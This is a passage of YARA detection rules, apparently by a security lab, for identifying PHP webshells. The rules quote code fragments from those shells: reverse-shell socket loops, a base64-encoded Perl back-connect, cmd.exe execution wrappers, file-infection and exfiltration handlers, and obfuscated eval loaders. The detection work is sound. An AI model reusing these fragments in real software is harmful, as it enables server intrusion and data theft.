      $s7 = "$result=exequery($sql, \" \", $_POST['ndbname']);" fullword ascii
      $s8 = "goto(\" \", $_SESSION['dbname'], $action, 'but', 'wyoq', $value );" fullword ascii
      $s9 = "//$result = @mysql_query( \"Select * from $tablename\" );" fullword ascii
      $s10 = "$nnewstring=explode(',',$snewstring,$num); // stick into an array" fullword ascii
      $s11 = "$flen = mysql_field_len($result, $i);//length of the field" fullword ascii
      $s12 = "if(strncmp($arr[1],'set',3)==0 ){//Sets can have combinations of values" fullword ascii
      $s13 = "echo\"<input type=hidden name='dbname' value='$dbname' />\\n\";" fullword ascii
      $s14 = "echo\"<input type=hidden name=dbname value='$dbname' />\\n\";" fullword ascii
      $s15 = "$pos=strpos($arr[1],'(' ); //find the position of '('" fullword ascii
      $s16 = "$dbname=$_SESSION['dbname'];" fullword ascii
      $s17 = "echo\"<td><input class=but type=reset name='reset' value='Reset Form' /></td>\\n\";" fullword ascii
      $s18 = "// Start of new code for set drop down" fullword ascii
      $s19 = "for ($i =0; $i < count($dbnamearray); $i++) {" fullword ascii
      $s20 = "my \\$cur_byte = \\$DCC{\\$fh}{curbyte};" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _691a4634dc5f78ceee68850138b8b68047b8dca6_7bd7bb6237c7654d933dc363cabbc553f9d21382_946a66a5f7f8be95ea7693ee5500bb404b9d0add_175
{
   meta:
      description = "php17 - from files 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 7bd7bb6237c7654d933dc363cabbc553f9d21382.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash2 = "617ed1a8b61dd1f84acd225bfe8dc36c479a1ad3c98b2bb335b2735cb4fb2fe7"
      hash3 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $x1 = "if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }" fullword ascii
      $s2 = "$text['eng'] = array('Connect to ftp server failed','Login to ftp server failed','Can\\'t change dir on ftp server');" fullword ascii
      $s3 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"download_file\" && !empty($_POST['d_name']))" fullword ascii
      $s4 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"mail_file\" && !empty($_POST['loc_file']))" fullword ascii
      $s5 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { echo re($_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s6 = "if(!$file=@fopen($_POST['d_name'],\"r\")) { echo re($_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s7 = "if(!$connection) { fe($language,0); $_POST['cmd'] = \"\"; }" fullword ascii
      $s8 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"mail\")" fullword ascii
      $s9 = "echo sr(15,\"<b>\".$lang[$language.'_text91'].$arrow.\"</b>\",in('radio','compress',0,'none').' '.$arh);" fullword ascii
      $s10 = "$res = mail($_POST['to'],$_POST['subj'],$_POST['text'],\"From: \".$POST['from'].\"\\r\\n\");" fullword ascii
      $s11 = "echo sr(25,\"<b>\".$lang[$language.'_text91'].$arrow.\"</b>\",in('radio','compress',0,'none').' '.$arh);" fullword ascii
      $s12 = "echo $fs.$table_up1.$lang[$language.'_text76'].up_down('id8').$table_up2.div('id8').$ts;" fullword ascii
      $s13 = "echo $fs.$table_up1.$lang[$language.'_text94'].up_down('id18').$table_up2.div('id18').$ts;" fullword ascii
      $s14 = "echo $fs.$table_up1.$lang[$language.'_text54'].up_down('id7').$table_up2.div('id7').$ts;" fullword ascii
      $s15 = "echo $fs.$table_up1.$lang[$language.'_text57'].up_down('id4').$table_up2.div('id4').$ts;" fullword ascii
      $s16 = "echo $fs.$table_up1.$lang[$language.'_text35'].up_down('id12').$table_up2.div('id12').$ts;" fullword ascii
      $s17 = "echo $fs.$table_up1.$lang[$language.'_text33'].up_down('id10').$table_up2.div('id10').$ts;" fullword ascii
      $s18 = "echo $fs.$table_up1.$lang[$language.'_text42'].up_down('id3').$table_up2.div('id3').$ts;" fullword ascii
      $s19 = "echo $fs.$table_up1.$lang[$language.'_text86'].up_down('id16').$table_up2.div('id16').$ts;" fullword ascii
      $s20 = "echo $fs.$table_up1.$lang[$language.'_text15'].up_down('id15').$table_up2.div('id15').$ts;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _1bc134acecdf6e441eb53718b93a3cda81c2b453_3c6b496a8ef29509d3325690f2db9d5119653272_176
{
   meta:
      description = "php17 - from files 1bc134acecdf6e441eb53718b93a3cda81c2b453.php, 3c6b496a8ef29509d3325690f2db9d5119653272.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "da6af9a4a60e3a484764010fbf1a547c2c0a2791e03fc11618b8fc2605dceb04"
      hash2 = "ca6284d5af5bd5095225d45084fe9626a7ac078ad2f4cc4020d6f86e5daad0d1"
   strings:
      $s1 = "if(@function_exists('ocilogon'))" fullword ascii
      $s2 = "$postgreSQL = '<font color=\"green\">OFF</font>';" fullword ascii
      $s3 = "$postgreSQL = '<font color=\"red\">ON</font>';" fullword ascii
      $s4 = "$mag=get_magic_quotes_gpc();" fullword ascii
      $s5 = "function PostgreSQL()" fullword ascii
      $s6 = "return $postgreSQL;" fullword ascii
      $s7 = "$openBaseDir = '<font color=\"green\">OFF</font>';" fullword ascii
      $s8 = "$registerg= '<font color=\"red\">ON</font>';" fullword ascii
      $s9 = "$msSQL = '<font color=\"red\">ON</font>';" fullword ascii
      $s10 = "$oracle = '<font color=\"red\">ON</font>';" fullword ascii
      $s11 = "$mysql = '<font color=\"red\">ON</font>';" fullword ascii
      $s12 = "$mSql = '<font color=\"red\">ON</font>';" fullword ascii
      $s13 = "$mysqli = '<font color=\"red\">ON</font>';" fullword ascii
      $s14 = "$gzip = '<font color=\"red\">ON</font>';" fullword ascii
      $s15 = "$openBaseDir = '<font color=\"red\">ON</font>';" fullword ascii
      $s16 = "$curl = '<font color=\"red\">ON</font>';" fullword ascii
      $s17 = "$registerg= '<font color=\"green\">OFF</font>';" fullword ascii
      $s18 = "$gzip = '<font color=\"green\">OFF</font>';" fullword ascii
      $s19 = "$mysqli = '<font color=\"green\">OFF</font>';" fullword ascii
      $s20 = "$msSQL = '<font color=\"green\">OFF</font>';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _01f78be6f7cad02658508fe4616098a9_15febc7c452fb361fc5eca8e67711a86a9ee0b9e_1898eebe767f4dda4709621164eeef8377c43bb3_36c1b4ea_177
{
   meta:
      description = "php17 - from files 01f78be6f7cad02658508fe4616098a9.php, 15febc7c452fb361fc5eca8e67711a86a9ee0b9e.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 36c1b4eaebafcab661febec9cbce65e6c4e063d4.php, 398fcc4176cbdefb9271ad67decbab5c08312bf2.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, acid.php, acidshell.php, ad1928ed1cec75b09a7d05548b47cae5c472a427.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
      hash3 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash4 = "dad311ac627ea5509814218f21e1f11d0f61632866aadaf5c3a43629f5801c1b"
      hash5 = "2884d456f6a33415db1ce6c8ef4a9a6ed860b3f76482c8460d27bd83120858ab"
      hash6 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash7 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash8 = "a6580477b138c01f062a33f2f204f412d3ffcdfd44dd6bffe476aefefab1fca3"
      hash9 = "a455a962041f9ef980414ecb1695c263cea42c41731caf1f0c34293cc937b1ef"
      hash10 = "63d02e75b729e2cc17604235cf9c0b506b3ca5d578a8e32a0e85e28763ca25a6"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEC" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAAAB" ascii
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB" ascii
      $s4 = "AAAAAAAAADAAAAAAAAAAAAAAAD" ascii
      $s5 = "AAAAAAAAAAAAAAABAAAAA" ascii
      $s6 = "AAAAAAAAAAAAAEAAAABAAAA" ascii
      $s7 = "//w4ck1ng Shell" fullword ascii
      $s8 = "50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAAAAA" ascii
      $s9 = "AABcAAAAAAAAAAAAAAA" ascii
      $s10 = "AAAAcAAAACAAAA" ascii
      $s11 = "AAAAAAAAACcAAAA" ascii
      $s12 = "AAAAAAAAAAAAAAAEAAAAAAAAADEAAAAFAAAAA" ascii
      $s13 = "AAAEAAAAAAAAAAAAAAAEAAAABAAAA" ascii
      $s14 = "AABAAAAAAAAAAAAAAABAAAAAAAAAC" ascii
      $s15 = "AAAAAAAAAAAAAAAAAAABAAAAAAAAAAE" ascii
      $s16 = "AAAAAAAAAAAAABAAAAAAAAACBAAAAA" ascii
      $s17 = "AAAEAAAAAAAAAAAAAAAEAAAAAAAAA" ascii
      $s18 = "AAAAAAEAEACEAAAA" ascii
      $s19 = "ABEAAAAAAAAAAAAAAA" ascii
      $s20 = "AAAADAAAAAAAAAAAAAAD" ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x733c ) and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _1n73ction_3451b6e3980c3b8b2f3ccbcfb04b227452ff084d_683f78842d7cf41a39744494a4bb787d6c6c4e91_abac629e73ef9917b352e81f0bb7e8d_178
{
   meta:
      description = "php17 - from files 1n73ction.php, 3451b6e3980c3b8b2f3ccbcfb04b227452ff084d.php, 683f78842d7cf41a39744494a4bb787d6c6c4e91.php, abac629e73ef9917b352e81f0bb7e8dfaf531ddf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9af1a6e4122d7751016c5aee923352962427c48ec0924bf007aac751cdad7af1"
      hash2 = "6e034b3b204db76ae71a6408b29580875a82d6285eb0ba11d29570e564e867d1"
      hash3 = "f3d0d694f2dd8b78a947a5e00c28d023c0fcc291ac5e70f74a81780bd5abb3e1"
      hash4 = "3af87f0ff8f9909f009c12e4a953921d185ecfe1cc39e0e79fb12b5709e28ad3"
   strings:
      $s1 = "socket_read($msgsock, $len-strlen($buffer));break;}}eval($buffer);echo \"[*] Connection Terminated\";die();}}" fullword ascii
      $s2 = "if ($_POST['xback_php']) {$ip = $rstarget4;$port = $rsportb4;$chunk_size = 1337;$write_a = null;$error_a = null;$shell = '/bin/s" ascii
      $s3 = "if ($_POST['xback_php']) {$ip = $rstarget4;$port = $rsportb4;$chunk_size = 1337;$write_a = null;$error_a = null;$shell = '/bin/s" ascii
      $s4 = "<a href=\\\"javascript:tukar('\".clearspace($file).\"_link','\".clearspace($file).\"_form2');\\\">\".get_perms($full).\"</a>" fullword ascii
      $s5 = "function testwget() {if (exe('wget --help')) {return showstat(\"on\");}else {return showstat(\"off\");}}" fullword ascii
      $s6 = "elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {" fullword ascii
      $s7 = "function ss($t){if (!get_magic_quotes_gpc()) return trim(urldecode($t));return trim(urldecode(stripslashes($t)));}" fullword ascii
      $s8 = "if(in_array($sock, $read_a)){$input = fread($sock, $chunk_size);fwrite($pipes[0], $input);}" fullword ascii
      $s9 = "if(in_array($pipes[1], $read_a)){$input = fread($pipes[1], $chunk_size);fwrite($sock, $input);}" fullword ascii
      $s10 = "<td style=\\\"text-align:center;\\\">\".date(\"d-M-Y H:i\",@filemtime($pwd)).\"</td><td><span id=\\\"titik1\\\">" fullword ascii
      $s11 = "function testcurl() {if (function_exists('curl_version')) {return showstat(\"on\");}else {return showstat(\"off\");}}" fullword ascii
      $s12 = "function testperl() {if (exe('perl -h')) {return showstat(\"on\");}else {return showstat(\"off\");}}" fullword ascii
      $s13 = "if ($pid == -1) exit(1);if ($pid) exit(0);if (posix_setsid() == -1) exit(1);$daemon = 1;}" fullword ascii
      $s14 = "function testmysql() {if (function_exists('mysql_connect')) {return showstat(\"on\");}else {return showstat(\"off\");}}" fullword ascii
      $s15 = "<input type=\\\"hidden\\\" name=\\\"name\\\" value=\\\"\".$folder.\"\\\" style=\\\"margin:0;padding:0;\\\" /> " fullword ascii
      $s16 = "<input type=\\\"hidden\\\" name=\\\"name\\\" value=\\\"\".$file.\"\\\" style=\\\"margin:0;padding:0;\\\" /> " fullword ascii
      $s17 = "</form></td><td>\".ukuran($full).\"</td><td style=\\\"text-align:center;\\\">\".$owner.\"</td><td><center>" fullword ascii
      $s18 = "umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if(!$sock) exit(1);" fullword ascii
      $s19 = "while(1){if(feof($sock)) break;if(feof($pipes[1])) break;$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = str" ascii
      $s20 = "eam_select($read_a, $write_a, $error_a, null);" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c20 or uint16(0) == 0x683c ) and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _15e31a66891cbd2c55427678d32f149faf39a0ce_3c6b496a8ef29509d3325690f2db9d5119653272_a9f6388eac0eaa83fb918cec6a54a073818c7682_179
{
   meta:
      description = "php17 - from files 15e31a66891cbd2c55427678d32f149faf39a0ce.php, 3c6b496a8ef29509d3325690f2db9d5119653272.php, a9f6388eac0eaa83fb918cec6a54a073818c7682.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "734eb849b064304217773d4ecc46c8d9fcd611bdf3c011acfa3da38c208a272c"
      hash2 = "ca6284d5af5bd5095225d45084fe9626a7ac078ad2f4cc4020d6f86e5daad0d1"
      hash3 = "ef6dd73e7cc055e1bd6e1618fbfc44f0043e15a6f2206d0c43f6f4b13646e569"
   strings:
      $x1 = "$res=$api->WinExec(\"cmd.exe /c $command >\\\"$name\\\"\",0);" fullword ascii
      $x2 = "$exec=$ws->exec(\"cmd.exe /c $command\"); " fullword ascii
      $x3 = "win_shell_execute('cmd.exe','',\"/C $command >\\\"$name\\\"\");" fullword ascii
      $x4 = "$cmd=(empty($_SERVER['ComSpec']))?'d:\\\\windows\\\\system32\\\\cmd.exe':$_SERVER['ComSpec'];" fullword ascii
      $s5 = "elseif(extension_loaded('ffi') && $windows)$exec=ffishelL($command);" fullword ascii
      $s6 = "win32_create_service(array('service'=>$n,'display'=>$n,'path'=>$cmd,'params'=>\"/c $command >\\\"$name\\\"\"));" fullword ascii
      $s7 = "elseif(extension_loaded('perl'))$exec=perlshelL($command);" fullword ascii
      $s8 = "$exec=ob_get_contents();" fullword ascii
      $s9 = "$exec=file_get_contents($name);" fullword ascii
      $s10 = "$exec=comshelL(\"dir \\\"$file\\\"\",$ws);" fullword ascii
      $s11 = "$af=getenv('ALLUSERSPROFILE');" fullword ascii
      $s12 = "file_put_contents('php.ini','safe_mode = Off');" fullword ascii
      $s13 = "$tmp=curl_exec($fh);" fullword ascii
      $s14 = "$exec=str_replace(\"\\t\",'',$exec);" fullword ascii
      $s15 = "$se=ini_get('session.save_path');" fullword ascii
      $s16 = "$uf=getenv('USERPROFILE');" fullword ascii
      $s17 = "$so=$exec->StdOut();" fullword ascii
      $s18 = "$exec=$output='';" fullword ascii
      $s19 = "$data=fread($fh,filesize($tmp));" fullword ascii
      $s20 = "$tmp=tempnam('','cx');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _35b0448cd3e328b11521ab053ea0c99694119b82_7e4723914113dcea43f5c7fe31576b45ab97bd12_8786355027e9ea8b98725019f1d594fd194cd412__180
{
   meta:
      description = "php17 - from files 35b0448cd3e328b11521ab053ea0c99694119b82.php, 7e4723914113dcea43f5c7fe31576b45ab97bd12.php, 8786355027e9ea8b98725019f1d594fd194cd412.php, a2baa41f5667eb2a3ad57003105e57ed0000af38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b87a5779c3b9ff9e4830be35799a297d9f7dce01d62b6953126f80e969e2a40e"
      hash2 = "d37e7daffca28c0d039f1c41e0d960cb912975fa51e391d12eb7330e983cb5de"
      hash3 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash4 = "7c07c724d568753b57ae312c6a01c30b0eb9b7117165ef6519d0c125fe751f08"
   strings:
      $s1 = "showSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s2 = "$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes(\"\\n$ \".$_POST['p1'].\"\\n\".ex($_POST['p1']),\"\\n\\r\\t\\'\\0\"));" fullword ascii
      $s3 = "@fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t));" fullword ascii
      $s4 = "<form name='nfp' onSubmit='g(null,null,this.using.value,this.port.value,this.pass.value);return false;'>" fullword ascii
      $s5 = "['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><input type=submit value=Eval style=\"margin-top:5px\">';" fullword ascii
      $s6 = "foreach (ListFiles($target) as $key=>$file){" fullword ascii
      $s7 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(null,null,this." ascii
      $s8 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(null,null,this." ascii
      $s9 = "$target=$_SERVER['DOCUMENT_ROOT'];" fullword ascii
      $s10 = "<form name='nfp' onSubmit='g(null,null,this.using.value,this.server.value,this.port.value);return false;'>" fullword ascii
      $s11 = "showSecParam('Userful', implode(', ',$temp));" fullword ascii
      $s12 = "if($_POST['p1'] == 'infect') {" fullword ascii
      $s13 = "if(($file<>$_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF'])&&(is_writeable($file))){" fullword ascii
      $s14 = "echo '<pre class=\"ml1\" style=\"margin-top:5px\" id=\"Output\">'.$temp.'</pre>';" fullword ascii
      $s15 = "showSecParam('Danger', implode(', ',$temp));" fullword ascii
      $s16 = "$w=@fopen($f,\"w\") or @function_exists('file_put_contents');" fullword ascii
      $s17 = "$ch = curl_init(\"file://\".$_POST['p2'].\"\\x00\".SELF_PATH);" fullword ascii
      $s18 = "$menu .= '<th>[ <a href=\"#\" onclick=\"g(\\''.$v.'\\',null,\\'\\',\\'\\',\\'\\')\">'.$k.'</a> ]</th>';" fullword ascii
      $s19 = "if( isset($_POST['p2']) && ($_POST['p2'] == 'info') ) {" fullword ascii
      $s20 = "ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _68ce068cb21775c4e91a66255ba7ee6b7c7b608d_adm666in_181
{
   meta:
      description = "php17 - from files 68ce068cb21775c4e91a66255ba7ee6b7c7b608d.php, adm666in.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1a6791f00bfa0a03eab327b6583e71b72e9ed48c7fc7358267a06804c9a9c4b4"
      hash2 = "db08485a7a1ada7727dc17b62034afb41cf515513934446751aa339cb2530863"
   strings:
      $s1 = "<?php$lll11l11l11l11l1=__FILE__;eval(base64_decode('JGxsMTFsbGwxMWxsbGwxMWw9Zm9wZW4oJGxsbDExbD" ascii
      $s2 = "MWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNN" ascii
      $s3 = "VEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hi" ascii
      $s4 = "Ykd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hz" ascii
      $s5 = "JGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNN" ascii
      $s6 = "oJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UVXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd" ascii
      $s7 = "bGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01USXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hz" ascii
      $s8 = "Yjg2dG00cXVfZWJkY2ZlanFjMnZvdHBkdndlCU5UWmFjM0p0ZVRnNWJXbDNZV0phYkhsWGNIazBkWE05CWVHNWFPV050WWpGa2NYTnNhbkZrWm1oSVkzaE5jbkU5CWRu" ascii
      $s9 = "ZXcgWmlwOw0KCW1ha2VwYXRoKFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCSR6LT5FeHRyYWN0KFJPT1RfUEFUSC4iY2FjaGUvdXBncmFkZS56aXAiLFJPT1Rf" ascii
      $s10 = "4bSULjFL6pblYuIkpO2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01qQXBPMlYyWVd" ascii
      $s11 = "UEFUSC4iY2FjaGUvdXBncmFkZSIpOw0KCXVubGluayhST09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIik7DQoJZWNobyAiPE1FVEEgSFRUUC1FUVVJVj1SRUZSRVNI" ascii
      $s12 = "aWYoJGpvYj09ImdldCImJiRBcG93ZXJbdXBncmFkZV9vbF0pDQp7DQoNCgloYWNrX2FkbWluX3RwbCgnZ2V0Jyk7DQp9DQplbHNlaWYoJGFjdGlvbj09ImdldCImJiRB" ascii
      $s13 = "qm82LqpqMrHT1O2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UQXBPMlYyWVd3b0p" ascii
      $s14 = "1URnNiR3d4TVd4c2JHd3hNV3dzTVRncE8yVjJZV3dvSkd3eGJHd3hNV3hzYkd4c01XeHNNV3dvSkd4c01URnNiR3hzYkd3eGJHeHNiR3dvSkd4c01URnNiR3d4TVd4c2" ascii
      $s15 = "cGFNVEZ1YW1KS2NIUnNabUpaYm1wWFpIQlJkMjQ5CU9HSmpZV3N6YjJ0U2FXMTVjSE5rYkdWSWMyaEpaSFk5CVoydGFkR0Z0YzNZNVlubDNjbnBhTjNSWGNtczBNbXM5" ascii
      $s16 = "WydteXB3ZCddKXsNCglyZXF1aXJlX29uY2UoZGlybmFtZShfX0ZJTEVfXykuIi8uLi8uLi9pbmMvcXEuYXBpLnBocCIpOw0KCUBldmFsKHFxbWQ1KCJVVjlBR3g0Zlhr" ascii
      $s17 = "2V2YWwoJGwxbGwxMWxsbGxsMWxsMWwoJ0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01UY3BPMlYyWVd3b0pHd3hiR3d4TVd4c" ascii
      $s18 = "T09UX1BBVEguImNhY2hlL3VwZ3JhZGUuemlwIikpDQoJew0KCX0NCgllbHNlaWYoJGNvZGU9c29ja09wZW5VcmwoJGZpbGV1cmwpKQ0KCXsNCgkJd3JpdGVfZmlsZShS" ascii
      $s19 = "RVFSQWdlR2tGRkV4aENXVkVMRmdsVlFrd0ZWZ3dkQVZnY1JFZ1dFUlFSVVFzYVFsbEZFUnRmZTU1Yjc0YWU4OSIsJ0RFJywkX1BPU1RbJ215cHdkJ10pKTsNCn0NCg0K" ascii
      $s20 = "hzYkd3b0pHeHNNVEZzYkd3eE1XeHNiR3d4TVd3c01USXBPMlYyWVd3b0pHd3hiR3d4TVd4c2JHeHNNV3hzTVd3b0pHeHNNVEZzYkd4c2JHd3hiR3hzYkd3b0pHeHNNVE" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule _0303e32c8e6674ec89356c9282eeac81606b4fb5_043c3d7e489c69b48737cc0c92d0f3a2_04edbee5e0a3cee384e464d05969bd89b0d32a52_0e634bcc_182
{
   meta:
      description = "php17 - from files 0303e32c8e6674ec89356c9282eeac81606b4fb5.php, 043c3d7e489c69b48737cc0c92d0f3a2.php, 04edbee5e0a3cee384e464d05969bd89b0d32a52.php, 0e634bcc16b562c9a8365ef42b37be8a0eabfd73.php, 2008.php, 2009mssql.php, 2011.php, 2011__2_.php, 2013.php, 49c50fe8a010c9849384328b5ca7738065be0a13.php, 5b9824d1b6de1963106fcabcbd08b1f87a29de30.php, 6ba8c54857834508e8be9eecc6c5a25b259fb4cd.php, 6e43c4411972b54c6780f45d8863e08470f6a814.php, 7a46a87a95f54ab5afc04ff43e14a060d7062f26.php, 82e9a1a1accef35ca21d1e7da20c851659596462.php, a647275c30e0a1e78903680ea97931aa8cd39118.php, aa8514a4fdeb999bcad59439fa0836b7178853a9.php, angel.php, angel2.php, angelbig.php, AngelShell_98c9a1a1ec03aa4c9f51292d4abe408ced4f7001.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "925fa1651076a0068d090b84fd85dcc6c07793a4c42fce8321920c5cae062ccb"
      hash2 = "8fd44823c19aafc02c2e1b4100b724e38d11d67ff21454995ceccaab08631371"
      hash3 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash4 = "c3f7e90a63448f7c30f4dd29dce054cd172b0be138896ee8317c72f5f2a48e40"
      hash5 = "6e0ea4ea135950956996df7e86fed9c7f7d77ff89aa1843ec5290ab38e638da4"
      hash6 = "f3f4f4806fca0d61da9e04cd730529f1424ef405581f424f669222f0b2ad1346"
      hash7 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash8 = "c8bf9b5705932c5daf06806e32f65cc2c32e0f32949ff585882d80e94776a8ac"
      hash9 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash10 = "1d4c1bc5afeca8d7755322dd900886f324e564d2969147bd90754438b63dab5f"
      hash11 = "4cb2f9e72641a594228669c0e2eb2188cc32fb13ae6708f3d2d39c620a76c8a9"
      hash12 = "22079a34d3f2bd293d057babdc4e8474cf6e718f1a11622082cdd93f8801a3f1"
      hash13 = "59302187103fbecff7be8b940f62a7d7e207cdbeed15624d4348dc9a5b021d07"
      hash14 = "a198556031139dcbe1c02e2e6e668f4388f4b1277c90fcf425e6834b934df75e"
      hash15 = "34fcf9b17604d49903cbb33e49a1ea5983a65333d7fd5d67d3ec3b904aa40df6"
      hash16 = "98c1937b9606b1e8e0eebcb116a784c9d2d3db0039b21c45cba399e86c92c2fa"
      hash17 = "23738a2cfdd29fa9dc4a1ff2d56de59ee03e76ff24ccac1462e29f1581d24c5e"
      hash18 = "80fe738fc052d94595dead391df3e26647e946120973521da619997ceec386bc"
      hash19 = "3ceb493e17daaaa547f05cf557885715fb575e684512dfc6b679c91285835995"
      hash20 = "0fd97a214233256bdfd5129cf8ff2129e0bb5804339e371acad303d2238e4f03"
      hash21 = "070c6119a886d2083ce66a4edca35d80075a89268bc15f76cce50df2ec59c708"
   strings:
      $s1 = "$back_connect=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj\"." fullword ascii
      $s2 = "$dbs[] = '-- Select a database --';" fullword ascii
      $s3 = "makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));" fullword ascii
      $s4 = "$data_size = $data_size + $table['Data_length'];" fullword ascii
      $s5 = "makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));" fullword ascii
      $s6 = "makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));" fullword ascii
      $s7 = "$table_rows = $table_rows + $table['Rows'];" fullword ascii
      $s8 = "foreach ($tabledb as $key => $table) {" fullword ascii
